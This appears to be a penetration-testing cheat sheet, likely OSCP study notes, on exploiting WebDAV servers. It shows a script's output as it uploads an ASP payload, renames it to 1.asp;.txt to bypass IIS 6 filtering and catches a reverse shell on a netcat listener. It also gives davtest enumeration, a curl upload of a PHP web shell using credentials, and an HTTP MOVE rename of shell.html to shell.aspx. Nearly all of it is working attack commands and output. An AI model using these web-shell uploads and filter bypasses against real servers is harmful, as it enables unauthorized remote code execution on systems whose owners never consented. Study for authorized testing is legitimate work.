# Webdav

```sh
root@kali:~/OSCP# ./webdav_upload_rce.py http://10.11.1.XXX 10.11.0.XXX 1337
[+] LHOST = 10.11.0.XXX
[+] LPORT = 1337
[+] Building payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of asp file: 38215 bytes
Saved as: /tmp/1.asp.txt
[+] Netcat port: 1337
listening on [any] 1337 ...
[+] Upload payload: /tmp/1.asp.txt
[+] Renaming for filter bypass: 1.asp;.txt
[+] Trigger payload
connect to [10.11.0.XXX] from (UNKNOWN) [10.11.1.XXX] 1124
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\\windows\\system32\\inetsrv>
```

## Filter bypass

IIS 6.0 or below Asp > upload as test.txt, copy or move file as test.asp;.txt
                                                                                                     
## Webdav enumeration

davtest -url http://xx.xx.xx.xx

## Upload shell 

curl -vvv --upload-file cmd.php http://xxx.xxx.xxx.xxx/webdav/cmd.php --user username:password

## Upload shell as html and rename to bypass filter

```sh
curl -vvv -T '/home/nighter/shell.html' 'http://xxx.xxx.xxx.xxx/'
curl -v -X MOVE --header 'Destination:http://xxx.xxx.xxx.xxx/shell.aspx' 'http://xxx.xxx.xxx.xxx/shell.html'
```
